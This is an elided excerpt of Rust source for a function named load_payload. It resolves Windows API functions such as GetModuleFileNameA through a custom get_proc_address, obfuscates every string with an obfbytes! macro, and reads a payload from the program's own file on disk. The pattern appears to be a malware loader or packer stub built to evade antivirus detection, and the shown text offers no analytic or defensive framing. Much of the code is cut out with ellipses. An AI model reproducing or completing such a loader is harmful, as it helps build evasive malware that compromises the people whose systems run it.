...
pub fn load_payload() -> Result<Vec<u8>, String> {
    ...
    unsafe {
        ...
        // Load functions
        let get_module_file_name_a: GetModuleFileNameAFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"GetModuleFileNameA\0").as_slice()).map_err(|_| String::from_utf8_lossy(obfbytes!(b"Failed to load GetModuleFileNameA\0").as_slice()).to_string())?);
        ...
        if len == 0 {
            return Err(String::from_utf8_lossy(obfbytes!(b"Failed to get module filename\0").as_slice()).to_string());
        }
        ...
        if handle == -1 { // INVALID_HANDLE_VALUE
            return Err(String::from_utf8_lossy(obfbytes!(b"Failed to open file\0").as_slice()).to_string());
        }
        ...
        if success == 0 {
            return Err(String::from_utf8_lossy(obfbytes!(b"Failed to read file\0").as_slice()).to_string());
        }
